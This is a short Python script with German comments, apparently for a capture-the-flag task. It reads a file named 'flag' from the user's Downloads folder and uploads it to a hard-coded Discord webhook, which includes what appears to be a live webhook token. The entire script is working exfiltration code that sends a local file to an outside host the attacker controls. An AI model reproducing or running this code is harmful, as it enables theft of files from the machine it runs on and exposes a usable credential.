
import os
import requests

# Ziel-Dateipfad
file_path = os.path.expanduser("~/Downloads/flag")

# Discord-Webhook
webhook_url = "https://discord.com/api/webhooks/1383009673388757035/u3gHQ_PHaJqBVojDoCbDxYwKrpIXGuT7rPurWnGJg2Tz8NQXoAU6_XqDhjHEyN63W_KE"

# Datei existiert?
if os.path.exists(file_path):
    with open(file_path, "rb") as f:
        files = {"file": (os.path.basename(file_path), f)}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 204:
            print("Datei erfolgreich gesendet.")
        else:
            print(f"Fehler: {response.status_code}")
else:
    print("Datei nicht gefunden.")
